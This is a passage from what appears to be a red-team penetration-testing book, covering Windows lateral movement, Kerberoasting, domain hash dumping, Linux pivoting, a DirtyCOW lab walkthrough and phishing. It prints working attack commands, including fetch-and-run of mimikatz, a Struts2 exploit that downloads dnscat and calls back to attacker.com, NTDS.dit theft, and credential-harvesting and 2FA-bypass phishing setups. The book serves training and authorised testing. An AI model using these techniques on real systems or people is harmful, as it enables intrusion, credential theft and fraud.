xp_cmdshell. good ol' xp_cmdshell is back! invoke_wmi: executes a stager on remote hosts using wmi. wmi is almost always enabled and this is a great way to execute your powershell payloads. jenkins_script_console: deploys an empire agent to a windows jenkins server with unauthenticated access to script console. as we know , jenkins servers are commonly seen and without credentials usually means full rce through the /script endpoint. invoke_dcom: invoke commands on remote hosts via mmc20.application com object over dcom (http://bit.ly/2qxq49l). allows us to pivot without psexec, wmi or psremoting. invoke_psexec: executes a stager on remote hosts using psexec type functionality . this is the old school way using psexec to move our file and execute. this could potentially set of f alarms, but still a good method if there is nothing else available. invoke_smbexec: executes a stager on remote hosts using smbexec.ps. instead of using psexec, we can do a similar attack with samba tools. invoke_sshcommand: executes a command on a remote host via ssh. invoke_wmi_debugger: uses wmi to set the debugger for a target binary on a remote machine to be cmd.exe or a stager . using debugger tools like sethc (sticky keys) to execute our agents. new_gpo_immediate_task: builds an 'immediate' schtask to push out through a specified gpo. if your user account has access to modify gpos, module lets you push out an ‘immediate’ scheduled task to a gpo that you can edit, allowing for code execution on systems where the gpo is applied. [http://www .harmj0y .net/blog/empire/empire-1-5/] these are just some of the easiest and most common techniques to move laterally . later in the book, we will discuss some of the lesser common techniques to get around the network. on most networks, windows management instrumentation (wmi) is generally enabled as it is required for managemen t of workstations. therefore we can use invoke_wmi to move laterally . since we are using cached credentials and our account has access to the remote host, we don't need to know the user's credentials. execute on remote system usemodule lateral_movement/invoke_wmi set the computer you are going to attack: set computername buzz.cyberspacekittens.local define which listener to use: set listener http remotely connect to that host and execute your malware: execute interact with the new agent agents interact <agent name> sysinfo lateral movement with dcom there are a number of ways to move laterally once on a host. if the compromised account has access or you are able to create tokens with captured credentials, we can spawn different shells using wmi, powershell remoting, or psexec. what if those methods are being monitored? there are some cool windows features that we can take advantage of by using the distributed component object model (dcom). dcom is a windows feature for communicating between software components on different remote computers. you can list all of a machine’ s dcom applications using the powershell command: get-ciminstance w in32_dcomapplication per @enigma0x3's research (https://enigma0x3.net/2017/01/23/lateralmovement-via-dcom-round-2/), he identified that there are multiple objects (for example, shellbrowserw indow and shellw indows) that allows the remote executio n of code on a victim host. when listing all the dcom applications (as seen as above), you will come across a shellbrowserw indow object with a clsid of c08afd90-f2a1-1 1d18455-00a0c91f3880. with that object identified, we can abuse this feature to execute binaries on a remote workstation as long as our account has access: powershell $([activator]::createinstance([type]::gett ypefromclsid(\"c08 afd90-f2a1-1 1d1-845500a0c91f3880\",\"buzz.cyberspacekittens.local\"))).navigate(\"c:\\ windows\\system32\\calc.exe\") this will only execute files locally on the system and we cannot include any command line parameters to the executable (so no cmd /k style attacks). instead, we can call files from remote systems and execute them, but note that the user will get a pop-up warning. in this case, i am currently on a victim's host neil.cyberspacekittens.local that has administrative access to a remote workstation called buzz. we are going to share one folder on neil's workstation and host our malici ous payload. next, we can call the dcom object to execute our hosted file on the remote victim's (buzz) machine. $([activator]::createinstance([type]::gett ypefromclsid(\"c08afd90f2a1-1 1d1-845500a0c91f3880\",\"buzz.cyberspacekittens.local\"))).navigate(\"\\\\neil.cybersp acekittens.local\\public\\adobeupdate.exe\") as you can see in the next image, a pop-up was presented on buzz's machine about running an adobeupdate.exe file. although most users would click and run this, it might get us caught. so, the better route to take to avoid this issue would be to move the file over (something like mounting the victim's drive) prior to using dcom to execute that file. @enigma0x3 took this even further and abused dcom with excel macros. first, we would need to create our malicious excel document on our own syste m and then use the powers hell script (https://bit.ly/2pzj9gx) to execute this .xls file on the victim host. one thing to note is that there are a multitude of other dcom objects that can get informat ion from systems, potentially start/stop services and more. these will definitely provide great starting points for additional research on dcom functionalities. resources: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcomround-2/ https://enigma0x3.net/2017/09/1 1/lateral-movement-usingexcel-application-and-dcom/ https://www .cybereason.com/blog/dcom-lateral-movementtechniques pass-the-hash the old way of pass-the-hash (pth) of local admin accounts has started to disappear for the most part. although not completely gone, let’s quickly review it. pth attacks utilize the windows ntlm hashes to authenticate to system s inste ad of using a user's credentials. why is this important? first off, hashes are easily recoverable using tools like mimikatz, can be pulled for local accounts (but require local admin access), are recoverable from dumping the domain controller (not clear text passwords), and more. the most basic use of pth is attacking the local administrator . this is generally rare to find due to the fact that, by default, the local admin account is now disabled and newer security features have surfac ed, such as local administrator password solution (laps) which creates random passwords for each workstation . in the past, getting the hash of the local admin account on one workstation was identical across the organization, meaning one compromise took out the whole company . of course, the requirements for this are that you have to be a local administrator on the system, that the local administrator account \"administrator\" is enabled, and that it is the rid 500 account (meaning it has to be the original administra tor account and cannot be a newly created local admin account). command: shell net user administrator user name administrator full name comment built-in account for administering the computer/domain user's comment country/region code 000 (system default) account active y es account expires never if we see that the account is active, we can try to pull all the hashes from the local machine. remember that this won't include any domain hashes: empire module: powershell/credentials/powerdump metasploit module: http://bit.ly/2qzsydi example: (empire: powershell/credentials/powerdump) > execute job started: 93z8pe output: administrator:500: aad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d 2b6cfc4470c1::: guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16a e931b73c59d7e0c089c0::: we could either use empire (credentials/mimikatz/pth) or we can boot up the trusted psexec, submit our hashes, and execute our custom payloads, as seen in the image below: as previously mentioned, this is the old way of moving laterally and is a rare find. if you are still lookin g at abusing local administrator accounts, but are in an environment that has laps (local administrato r password solution), you can use a couple of different tools to pull them out of active directory . this assumes you already have a privileged domain admin or helpdesk type account: https://github.com/rapid7/metasploitframework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb ldapsearch -x -h 10.100.100.200 -d \"elon.muskkat\" -w password -b \"dc=cyberspacekittens,dc=local\" \"(ms-mcs-admpwd=*)\" ms-mcs-admpwd [https://room362.com/post/2017/dump-lapspasswords-with-ldapsearch/] this is a great way to keep moving laterally without burning your helpdesk useraccount. gaining cr edentials fr om service accounts what if you find yourself in a scenario where you are a limite d user, can't pull passwords from memory , and had no luck with passwords on the host system... what do you do next? well, one of my favorite attacks is called kerberoasting. we all know that there are flaws with ntlm due to one-way hashes with no salts, replay attacks, and other traditional problems, which is why many companies have been moving to kerberos. as we know , kerberos is a secure method for authenticating a request for a service in a computer network. we won't go too deep into the implementation of kerberos in windows. however , you should know that the domain controller typically acts as the ticket granting server; and users on the network can request ticket granting t ickets to gain access to resources. what is the kerberoast attack? as an attacker , we can reque st kerberos service tickets for any of the spns of a target service account that we pulled earlier . the vulnerability lies in the fact that when a service ticket is requested from the domain controller , that ticket is encrypted with the associated servic e user’s ntlm hash. since any ticket can be requested by any user, this means that, if we can guess the password to the associated service user’s ntlm hash (that encrypted the ticket), then we now know the password to the actual servic e account. this may sound a bit confusing, so let's walk through an example. similar to what we did before, we can list all the spn services. these are the service accounts for which we are going to pull all the kerberos tickets: setspn -t cyberspacekittens.local -f -q */* we can either target a single user spn or pull all the user kerberos tickets into our user's memory: targeting a single user: powershell add-t ype -assemblyname system.identitymodel; new-object system.identitymodel.t okens.kerberosrequestorsec urityt oken -ar gumentlist \"http/cskgithub.cyberspacekittens.local\" pulling all user t ickets into memory powershell add-t ype -assemblyname system.identitymodel; iex (new-object net.w ebclient).downloadstring(\"https://raw .githubus ercontent.com/nidem/kerberoast/master/getuserspns .ps1\") | foreach-object {try{new-object system.identitymodel.t okens.kerberosrequestorsec urityt oken -ar gumentlist $_.serviceprincipalname}catch{}} of course, you can also do this with powersploit: https://powersploit.readthedocs.io/en/latest/recon/inv oke-kerberoast/ if successful, we have importe d either one or many differen t kerberos tickets into our victim computer 's memory . we now need a way to extract the tickets. t o do this, we can use good ol' mimikatz kerberos export: powershell.exe -exec bypass iex (new-object net.w ebclient).downloadstring('http://bit.ly/2qx4kuh'); invoke-mimikatz -command '\"\"\"kerberos::list /export\"\"\"' once we export the tickets, they will reside on our victim's machine. we will have to download them off of their systems before we can start cracking them. remember that the tickets are encrypted with the service account's ntlm hash. so, if we can guess that ntlm hash, we can read the ticket, and now know the service account’ s password as well. the easiest way to crack accounts is using a tool called tgsrepcrack (jtr and hashcat do also support crackin g kerberoast, which we will talk about in a second). using kerberoast to crack tickets: cd /opt/kerberoast python tgsrepcrack.py [password wordlist] [kirbi tickets - *.kirbi] in this case, the password for the service account csk-github was “p@ssw0rd!” of course, there is a powershell module in empire that does all the hard work for us. this is located under powershell/credentials/invoke_kerberoast (https://github.com/empireproject/empire/blob/master/data/module_source/credentials/invokekerberoast.ps 1). you can output the results in john the ripper or even hashcat formats to crack the passwords. i have previously had some issues running the powershell script in very large environments, so the fallba ck is to use powershell and mimikatz to pull all the tickets down. dumping the domain controller hashes once we have obtained domain administrative access, the old way to pull all the hashes from the dc was to run commands on the domain controller and use shadow volume or raw copy techniques to pull off the ntds.dit file. reviewing the v olume shadow copy t echnique since we do have access to the file system and can run comm ands on the domain controller , as an attacker , we want to grab all the domain hashes stored in the ntds.dit file. unfortunately , that file is const antly being read/written to and even as system, we do not have access to read or copy that file. luckily for us, we can take advantage of a w indows feature called volume shadow copy service (vss), which will create a snaps hot copy of the volume. we can then read the ntds.dit file from that copy and pull it off the machine. this would includ e stealing the ntds.dit, system, sam, and boot key files. lastly , we need to clean our tracks and delete the volume copy: c:\\vssadmin create shadow /for=c: copy \\\\? \\globalroot\\device\\harddiskv olumeshadowcopy[disk_ number]\\windows\\ntds\\ntds.dit . copy \\\\? \\globalroot\\device\\harddiskv olumeshadowcopy[disk_ number]\\windows\\system32\\config\\system . copy \\\\? \\globalroot\\device\\harddiskv olumeshadowcopy[disk_ number]\\windows\\system32\\config\\sam . reg sa ve hklm\\system c:\\sys vssadmin delete shadows /for= [/oldest | /all | /shadow=] ninjacopy ninjacopy (http://bit.ly/2hpvkw j) is another tool that, once on the domain controller , can be used to grab the ntds.dit file. ninjacopy \"copies a file from an ntfs partitioned volume by reading the raw volume and parsing the ntfs structures. this bypasses file dacl's, read handle locks, and sacl's. you must be an admini strator to run the script. this can be used to read system files which are normally locked, such as the ntds.dit file or registry hives.” [http://bit.ly/2hpvkwj] invoke-ninjacopy -path \"c:\\windows\\ntds\\ntds.dit\" localdestination \"c:\\windows\\temp\\ntds.dit\" dcsync now that we have reviewed the old methods of pulling hashes from the dc —which require d you to run system commands on the dc and generally drop files on that machine—let’ s move onto the newer methods. more recently , dcsync, written by benjamin delpy and vincent le toux, was introduced and changed the game on dumping hashes from domain controllers. the concept of dcsync is that it impersonates a domain controller to request all the hashes of the users in that domain. let that sink in for a second. this means, as long as you have permissions, you do not need to run any commands on the domain controller and you do not have to drop any files on the dc. for dcs ync to work, it is important to have the proper permissions to pull hashes from a domain contr oller. generally limited to the domain admins, enterprise admins, domain controllers groups, and anyone with the replicating changes permissions set to allow (i.e., replicating changes all/replicating directory changes), dcsync will allow your user to perfo rm this attack. this attack was first developed in mimikatz and could be run with the following command: lsadump::dcsync /domain:[your domain] /user: [account_to_pull_hashes] even better , dcsync was pulled into tools like powershell emp ire to make it even easier . module for empire: powershell/credentials/mimikatz/dcsync_hashdump looking at the dcsync hashdu mp, we see all the ntlm hashes for the users in active directory . additionally , we have the krbtgt ntlm hash, which means we now (or in future campaigns) can perform golden ticket attacks. lateral movement via rdp over the vps in today 's world, with a ton of next gen av, running wmi /powershell remoting/psexec laterally between computers isn't always the best option. we are also seeing that some organizations are logging all windows command prompts. to get around all of this, we sometimes need to go back to basics for lateral movement. the issue with using vps servers is that it is only a shell with no gui interface. therefore, we will route/proxy/forward our traffic from our attacker host, throug h the vps, through our compromised hosts , and finally laterally to our next victim. luckily for us, we can use native tools to accomplish most of this. first, we will need to set up a vps server , enable ports from the internet, configure metasploit with ptf, and infect your initial victim with meterpreter . we could do this with cobalt strike or other frameworks, but we will use meterpreter in this case. we can take advantage of the default ssh client by using local port forwarding (-l). in this scena rio, i am using my mac, but this could be done on a windows or linux system as well. we are going to connect to our vps over ssh using our ssh key. we are also going to configure a local port, in this case 3389 (rdp), on our attacker machine to forward any traffic made to that port to our vps. when that traffic over that port is forwarded to our vps, it will then send that traffic to localhost on port 3389 on the vps. finally, we need to set up a port listening on our vps on port 3389 and set up a port forward through our compromised victim using meterpreter's port forward feature to route to our victim's system. 1. infect our victim with a meterpreter payload. 2. ssh from our attacker machine and set up the local port forward on our attacker system (listen on port 3389 locally) to send all traf fic destined for that port to the vps's localhost port on 3389. ssh -i key .pem ubuntu@[vps ip] -l 127.0.0.1:3389:127.0.0.1:3389 3. set up a port forward on the meterpreter session to listen on the vps on port 3389 and send that traf fic through our infected machine to the next lateral movement server portfwd add -l 3389 -p 3389 -r [v ictim via rdp ip address] 4. on our attacker machine, open our microsoft remote desktop client, set your connection to your own localhost - 127.0.0.1 and enter the v ictim's credentials to connect via rdp . pivoting in linux pivoting in linux hasn't change d too much over the years. usually if you are using something like dnscat2 or meterpreter , they all suppo rt their own forwarding. dnscat2: listen 127.0.0.1:9999 <tar get_ip>:22 metasploit post/windows/manage/autoroute metasploit socks proxy + proxychains use auxiliary/server/socks4a meterpreter: portfwd add –l 3389 –p 3389 –r <tar get_ip> if you are lucky to get an ssh shell, there are a number of ways we can pivot through that system. how might we get an ssh shell? in many cases, once we get either local file inclusion (lfi) or remote code execution (rce ), we can try to privilege escalate to read the /etc/shadow file (and password crack) or we can pull some mimikatz style trickery . just like windows and mimikatz, linux systems also run into the same issue where passwords are be stored in clear text. a tool written by @hunter gregal dumps specific processes that have a high probability of containing the user's passwords in clear text. although this only works on a limited number of linux system s to date, the same concepts can be used across the board. you can see exactly what systems and from where passwords are being grabbed here: https://github.com/hunter gregal/mimipenguin. once we get credentials on our compromised hosts and can ssh back in, we can tunnel our traffic and pivot between boxes. within ssh, we have some great features that allow us to perform this pivoting: setting up dynamic sock proxy to use proxychains to pivot all of our traf fic through our host: ssh -d 127.0.0.1:8888 -p 22 <user>@<t arget_ip> basic port forwards for a single port: ssh <user>@<t arget_ip> -l 127.0.0.1:55555: <target_to_pivot_to>:80 vpn over ssh. this is an awesome feature that makes it possible to tunnel layer 3 network traf fic of ssh. http://bit.ly/2emppfb privilege escalation linux privilege escalation is just like windows, for the most part. we look for vulnerable services that we can write to, sticky bit misconfigurations, passwords in flat files, world -writable files, cronjobs, and, of course, patching issues. in terms of effectively and efficiently parsing a linux box for privilege escalation issues, we can use a few tools to do all the legwork for us. before we do any sort of privil ege escalation exploits, i like to first get a good read on the linux host and identify all the information about the system. this includes users, services, cronjobs, versions of software, weak creds, misconfig ured file permissions, and even docker information. we can use a tool called linenum to do all the dirty work for us (https://github.com/rebootuser/linenum). this is a very long report on everything you could ever want to know about the underlying system and is great to have for future campaigns. once we gain information abou t the system, we try to see if we can exploit any of these vulnerabilities. if we can't find any sticky bit vulnerabilities or abuse misconfigurations in servi ces/cronjobs, we go straight for exploits on the system/applications. i try to do these last as there is always a potential possibility to halt/brick the box. we can run a tool called linux-exploit-suggester (https://github.com/mzet-/linux-exploit-suggester) to analyze the host system and identify missing patches and vulnerabilities. once a vulnerability is identified, the tool will also provide you with a link to the poc exploit. now , what are we looking for to exploit? this is where experience and practice really come into play. in my lab, i will have a huge number of different linux versions configured to validate that these exploits won't crash the underlying system. one of my favorite vulnerabil ities in this scenario is dirtycow . dirtycow is \"a race condition was found in the way linux kernel's memory subsystem handled breakage of the read only private mappings cow situation on write access. an unprivileged local user could use this flaw to gain write access to otherwise read only memory mappings and thus increase their privileges on the system.” [https://dirtycow .ninja/] in short, this vulnerability allows an attacker to go from a non-privileged user to root via kernel vulnera bilities. this is the best type of privilege escalation we could ask for! the one issue though is that it is known to cause kernel panics, so we have to make sure to use the right versions on the right linux kernels. testing dirtycow on ubuntu (ubuntu 14.04.1 lts 3.13.0 -32-generic x86_64): download the dirtycow payload wget http://bit.ly/2vdh2ub -o dirtycow-mem.c compile the dirtycow payload gcc -w all -o dirtycow-mem dirtycow-mem.c -ldl lpthread run dirtycow to get to system ./dirtycow-mem turn of f periodic writeback to make the exploit stable echo 0 > /proc/sys/vm/dirty_writeback_centisecs try reading the shadow file cat /etc/shadow linux lateral movement lab the problem with lateral movement is that it is hard to practice without having an environment set up to pivot. so, we present you the csk secure network lab. in this lab, you are going to pivot between boxes , use recent exploits and privilege escalation attacks, and live off the land in a linux environment. setting up the v irtual environment the setup for this virtual environment lab is slightly complex. this is because the network is going to require three different static virtual machines to run and there is some prior setting up required on your part. all this is tested in vmw are w orkstation and vmware fusion, so if you are using v irtualbox, you might have to play around with it. download the three v irtual machines: http://thehackerplaybook.com/get.php?type=csk-lab although you should not need the root accounts for these boxes, here is the username/password, just in case: hacker/changeme. all three of the virtual machines are configured to use the nat networking interface. for this lab to work, you will have to configure your virtual machine's nat settings in vmw are to use the 172.16.250.0/24 network. to do this in w indows vmw are w orkstation: in the menu bar , go to edit -> virtual network editor -> change settings select the interface for type na t (mine is vmnet8) change subnet ip 172.16.250.0 and hit apply in osx, it is more complicated. y ou will need to: copy the original dhcpd.conf as a backup sudo cp /library/preferences/vmware\\ fusion/vmnet8/dhcpd.conf /library/preferences/vmware\\ fusion/vmnet8/dhcpd.conf.bakup edit the dhcpd.conf file to use 172.16.250.x instead of the 192.168.x.x networks sudo vi /library/preferences/vmware\\ fusion/vmnet8/dhcpd.conf edit the nat.conf to use the correct gateway sudo vi /library/preferences/vmware\\ fusion/vmnet8/nat.conf # na t gateway address ip = 172.16.250.2 netmask = 255.255.255.0 restart the service: sudo /applications/vmware\\ fusion.app/contents/library/services/services.sh -stop sudo /applications/vmware\\ fusion.app/contents/library/services/services.sh -start now , you shoul d be able start your thp kali vm in nat mode and get a dhcp ip in the 172.16.250.0/2 4 range. if you do, boot up all three other lab boxes at the same time and start hacking away . attacking the csk secur e network you have finally pivoted your way out of the windows environment into the secure production network. from all your reconnaissance and research, you know that all the secrets are stored here. this is one of their most protected netwo rks and we know they have segmented their secure infrastructure. from their documentation, it looks like there are multiple vlans to compromise and it seems you will have to pivot between boxes to get to the vault database. this is everything you have trained for... pivoting to the outside of the secure network area, you see that the network range configured for this environment is in the 172.16.250.0/24 network. since you don't know too much about this network, you start by kicking off some very light nmap scans. you need to identify which systems are accessible from outside this network in order to determine how you can start your attack. scan the secure network: nmap 172.16.50.0/24 you notice there are three boxes up and running, but only one of them has web ports enabled. it looks like the other two boxes are isolated from outside the secure network, which means we will have to compromise the 172.16.250.10 box first to be able to pivot into the other two servers. visiting the first box (172.16.250.10), you see that apache tomcat is listening on port 8080 and some opencms is on port 80. running a web fuzzer you notice that the open cms page is also running apache struts2 (/struts2-showcase). instantly , flashbacks of the equifax breach hit you like a brick. you think to yourself, this is too good to be true, but you have to check anyway . you run a quick search on msfconsole and test the exploit \"struts2_content_type_ognl\". we know that csk heavily monitors their protected network traffic and their internal servers may not allow direct access to the corporate network. to get around this, we are going to have to use our dns c2 payload with dnscat2 to communicate over udp instead of tcp. of course in the real world, we migh t use an authoritative dns server , but for lab sake, we will be our own dns server . [thp kali machine] the thp kali custom virtual machine should have all the tools to perform the attacks. we need to host our payload on a webserver , so that we can have our metasploit payload grab the dnscat malware. inside the dnscat2 client folder is the dnscat binary . cd /opt/dnscat2/client/ python -m simplehttpserver 80 start a dnscat server cd /opt/dnscat2/server/ ruby ./dnscat2.rb record your secret key for dnscat open a new t erminal and load metasploit msfconsole search for struts2 and load the struts2 exploit search struts2 use exploit/multi/http/struts2_content_type_ognl configure the struts2 exploit to grab our dnscat payload and execute on the victim server . make sure to update your ip and secret key from before. set rhost 172.16.250.10 set rpor t 80 set t argeturi struts2-showcase/showcase.action set payload cmd/unix/generic set cmd wget http://<your_ip>/dnscat -o /tmp/dnscat && chmod +x /tmp/dnscat && /tmp/dnscat --dns server=attacker .com,port=53 --secret=<y our secret key> run once the payload executes, you will not get any sort of confirmation in metasploit as we used a dnscat payload. y ou will need to check your dnscat server for any connections using dns traf fic. back on your dnscat2 server , check your newly executed payload and create a shell terminal. interact with your first payload window -i 1 spawn a shell process shell go back to the main menu with the keyboard buttons ctrl + z interact with your new shell window -i 2 type in shell commands ls you have compromised the opencms/apache struts server! now what? you spend some time reviewing the server and looking for juicy secrets. you remember that the server is running the opencms web application and identify that the app is configured under /opt/tomcat/webapps/kittens. in reviewing the configuration file of the opencms properties, we find the database, username, password, and ip address of 172.16.250.10. retrieving the database information: cat /opt/tomcat/webapps/kittens/webinf/config/opencms.properties we connect to the database, but we do not see much. the problem is that we are currently a limited tomcat user, which is really hindering our attack. therefore, we need to find a way to escalate. running post exploitation reconnaissance (uname -a && lsb_release -a) on the server , you identify that this is a pretty old version of ubuntu. luckily for us, this server is vulnerable to the privilege escalation vulnerability dirtycow . let's create a dirtycow binary and get to root! privilege escalation through dnscat: download and compile dirtycow : cd /tmp wget http://bit.ly/2vdh2ub -o dirtycow-mem.c gcc -w all -o dirtycow-mem dirtycow-mem.c -ldl lpthread ./dirtycow-mem try to keep the dirtycow exploit stable and allow reboots for kernel panics echo 0 > /proc/sys/vm/dirty_writeback_centisecs echo 1 > /proc/sys/kernel/panic && echo 1 > /proc/sys/kernel/panic_on_oops&& echo 1 > /proc/sys/kernel/panic_on_unrecovered_nmi && echo 1 > /proc/sys/kernel/panic_on_io_nmi && echo 1 > /proc/sys/kernel/panic_on_warn whoami note: dirtycow is not a very stable privilege escalation. if you are having problems with your exploit, check out my github page for a more stable process of creating a setuid binary here: https://raw .githubusercontent.com/cheetz/dirtycow/master/thplab if you are still having problems , the other option is to log into the initial server over ssh and execute the dnscat payload as root. to log in, use the creden tials hacker/changeme and sudo su - to root. now , you have become root on the system due to the lack of patching on the host system. as you start pillaging the box for secrets again , you come across root's bash history file. inside this file you find an ssh command and private ssh key reference. we can take this ssh key and log into our second box, 172.16.250.30: cat ~/.bash_history head ~/.ssh/id_rsa ssh -i ~/.ssh/id_rsa root@172.16.250.30 you spend some time on the second box and try to understand what it is used for. search ing around, you notice there is a jenkins user in the /home directory , which leads you to identify a jenkins service running on port 8080. how can we use our browser to see what's on the jenkins server? this is where dnscat's port forward feature comes into play. we need to back out of our initial shell and go to the command terminal. from there, we need to set up a listener to forward our traffic from our attacker machine, throug h the dnscat, to the jenkins box (172.16.250.30) over port 8080. execute a dnscat port forward: back out of our current shell ctrl + z go back to our first command agent and set up a listener/port forward window -i 1 listen 127.0.0.1:8080 172.16.250.30:8080 on your thp kali vm, go to a browser and use our port forward (it will be very slow over dns): http://127.0.0.1:8080/jenkins inside the crede ntial manager within the jenkins app, we are going to see that the db_bac kup user password is stored, but not visible. we need to figure out a way to get this credential out of jenkins, so that we can continue to move laterally . n00py did some great research on stored credentials within jenkins and how to extract them (http://bit.ly/2guin9s). we can take advantage of this attack using our existing shell and to grab the credentials.xml, master .key, and hudson.util.secret files. go back to the main menu in dnscat and interact with your original shell ctrl + z window -i 2 go to the jenkins' home directory and grab the three files: credentials.xml, master .key, and hudson.util.secret. cd /home/jenkins we can either try to download these files of f or we could base64 these files and copy them of f via the current shell. base64 credentials.xml base64 secrets/hudson.util.secret base64 secrets/master .key we can copy the base64 output back onto our kali box and decode them to reverse the password for the db_backup user . cd /opt/jenkins-decrypt echo \"<base64 hudson.util.secret>\" | base64 --decode > hudson.util.secret echo \"<base64 master .key >\" | base64 --decode > master .key echo \"<base64 credentials.xml >\" | base64 --decode > credentials.xml decrypt the password using https://github.com/cheetz/jenkinsdecrypt python3 ./decrypt.py master .key hudson.util.secret credentials.xml we were able to successfully decrypt the db_backup user's password of \")udvra{4ul^;r?*h\". if we look back at our earlier notes, we see in the opencms properties file that the database server was located on 172.16.250.50. it looks like this jenkins server , for some reason, performs some sort of backup against the database server . let's check if we can take our credentials of db_backup: )udvra{4ul^;r?*h to log into the database server via ssh. the only proble m is that through our dnscat shell, we don't have direct standard input (stdin) to interact with ssh's password prompt. so, we will have to use our port forward again to pass our ssh shell from our thp kali vm, through the dnscat agent, to the database server (172.16.250.50). go back to the command shell ctrl + z window -i 1 create a new port forward to go from localhost to the database server at 172.16.250.50 listen 127.0.0.1:2222 172.16.250.50:22 once on the database server (172.16.250.50) with the db_backup account, we notic e that this account is part of the sudoers file and can sudo su to root. once root on the database server , we poke around, but can't find any credentials to access the databa se. we could reset the root db password, but that might end up breaking some of the other applications. instead, we search for the different databases located under /var/lib/mysq l and come across a cybersp acekittens datab ase. here, we find the secrets.ibd file that holds all the data for the secret s table. as we read through the data, we realize that it might be encrypted... it is up to you to figure out the rest... congrats!!! you have successfully compromised the cyber space kittens network! don't stop here... there are many things you can do with these boxes; we have only touched the surface. feel free to play around on these systems, find more sensitive files, figure out other ways to privilege escalate, and more. for reference, in this lab, the environment topology is represented below: conclusion in this chapter , we went throug h compromising the network. we started either on the network with no credentials or social engineered our way to our first victim box. from there, we were able to live off the land, gain information about the network/systems, pivot around boxe s, escalate privileges, and ultimately comp romise the whole network. this was all accomplished with minimal scanning, using features of the network, and trying to evade all sources of detection. 5 the screen - social engineering building your social engineering (se) campaigns as red teamers, we love social engineering (se) attacks. not only because it can generally compri se of low skillset attacks, but because it is also easy to craft a highly trustworthy campaign at very low cost. just set up a couple of fake domains, servers, craft some emails, drop some usb sticks, and call it a day . in terms of metrics, we capture the obvious things like the number of emails sent, number of users who clicked on the link, and number of users that type in their password. we also try to get creative and bring substantive value to the companies who hire us. an example of this is defcon’ s social engineering competition, where competitors social engineer call centers and employees. if you aren't familiar with this competition, these competitors have a limited amount of time to find a number of flags based on the company . flags can be captured by gaining company information such as their vpn, what type of av they use, emplo yee-specific information, or being able to get an employee to visit a url, and more. if you want to see all the flags used in the competition, check out the 2017 competition report: http://bit.ly/2hlctvy . these types of attack s can help a company increase internal awar eness by teaching their employees how to spot evil and report them to the proper teams. in this chapter , we are going to lightly touch on some of the tools and techniques we use to run our campaigns. w ith se style attacks, there are no right or wrong answers. as long as they work, it's all good in our book. doppelganger domains we talked a lot about this in thp2. this is still one of the most successful ways to get that initial credential or drop malware. the most common technique is to purchase a domain that is very similar to a company’ s url or is a common mistype of their url. in the last book, we had an example where if we had mail.cyberspacekittens.com, we would purchase the domain mailcyberspacekittens.com and set up a fake outlook page to capture credentials. when the victim s go to the fake site and type in their password, we would collect that data and redirect them to the company's valid email server (mail.cyberspacekittens.com). this gives them the impression that they just accidentally mistyped their password the first time and therefore proceed with their login once more. the best part of all of this is that you don't really have to do any phishing. someone will mistype or forget the period (.) between “mail” and “cyberspacekittens”, then type in their credentials. we have had victims bookmark our malicious site and come back every day . how to clone authentication pages one of the best tools to quickly clone web application authentication pages is the social engineering toolkit (set) by trustedsec. this is a standard tool for any se campaign wher e gaining credentials is a priority . you can download set at https://github.com/trustedsec/social-engineer -toolkit. setting up set configure set to use apache (versus the default python) modify the config file to the following gedit /etc/setoolkit/set.config apache_ser ver=on apache_direct ory=/var/www/html har vester_log=/var/www/html start social engineering t oolkit (set) cd /opt/social-engineer -toolkit setoolkit 1) spear -phishing attack v ectors 2) w ebsite attack v ectors 3) credential harvester attack method 2) site cloner ip of your attacker server site to clone open a browser and go to your attacker server and test all files will be stored under /var/www/html and passwords under harvester*. some best practices when cloning pages for social engineering campaigns: move your apache server to run over ssl move all images and resources locally (instead of calling from the cloned site) personally , i like to store all recorded passwords with my public pgp key. this way, if the server is compromised, there is no way to recover the passwords withou t the private key. this can all be supported with php gnupg_encrypt and gnupg_decrypt. credentials with 2f a we are seeing more customers with two factor authentication (2fa). although 2fa is a big pain for red teams, they aren't impossible to get around. historically , we have had to create custom pages that would handle some of this, but now we have reelphish. reelphish, a tool made by fireeye, allows a red team to utilize selenium and chrome to trigger the 2fa automatically when a victim enters credentials on our phishing page. reelphish https://github.com/fireeye/reelphish: clone victim site that requires 2f a authentication on your own attacker box, parse the traf fic required to log into the real site. in my case, i open burp suite and get all the post parameters required to authenticate modify the clone site so that it uses reelphish. see the . /examplesitecode/samplecode.php and input all the necessary parameters your authentication requires victim falls for cloned site and authenticates credentials are pushed back to the attacker reelphish will authenticate to the real site, triggering 2f a victim receives 2f a code or phone push victim is redirected to the real site to log in again (thinking they failed the initial time) as reflected in the following image, we should now have an authenticated session bypassin g 2fa. althou gh it does looks like it supports linux, i have had some issues getting it to run in kali. running it in windows is preferred. you can find more information on reelphish on fireeye's website: https://www .fireeye.com/blog/threat-research/2018/02/reelphishreal-time-two-factor -phishing-tool.html. there are a few other tools that handle dif ferent 2f a bypasses as well: https://github.com/kgretzky/evilginx https://github.com/ustayready/credsniper one thing i want to mention about authenticating to 2fa resources is to make sure you verify all the different authentication methods once you have credentials. what i mean by this is that they may have 2fa for the web authentication portal, but it might not be required for apis, older thick clients, or all application endpoints. we have seen many applications require 2fa on common endpoi nts, but lack the security protect ion on other parts of the application. phishing another techniq ue where red teams have great success is traditional phishing. phishing, at its core, relies on either fear, urgency , or something that just sounds too good to be true. fear and urgency do work well and i am sure we have all seen it before. some examples of fear and urgency types of attacks include: a fake email with a fraudulent purchase someone hacked into your email message email about tax fraud the issue with these general attacks is that we are noticing that corporate employees are getting smarter and smarter . usually , at least 1 out of every 10 emails for basic phish style attack will get reported. in some cases, the numbers are much higher . this is where it is valuable for a red team to continually monitor these easy phish attacks to see if a company is getting better at responding to these situations. for those looking for more automated attacks, we really like gophish (http://getgophish.com/documentation/). it is fairly easy to set up and maintain, supports templates and html, and tracks/documents everything you need. if you are a fan of ruby , there is also phishing frenzy (https://github.com/pentestgeek/phishing-frenzy); and for python, there is king phisher (https://github.com/securestate/king-phisher). these automated tools are great for recording straightforward phishing campaigns. for our target campaigns, we go with a more manual approach. for example, if we do some reconnaissance on the victim's mail records and identify that the client is using office 365, then we can figure out how to build a very realistic campaign with that information. additionally , we try to find any leaked emails from that company , programs they might be running, new features, system upgrades, mergers, and any other information that might help. there are also times when we run more targeted executive campaigns. in these campaigns, we try to use all the open source tools to search for information about people, their properties, families and more. for example, if targeting an executive, we would search them on pipl.com, get their social media accounts, find out where their kids go to school, and spoof an email from their school saying they need to open this word 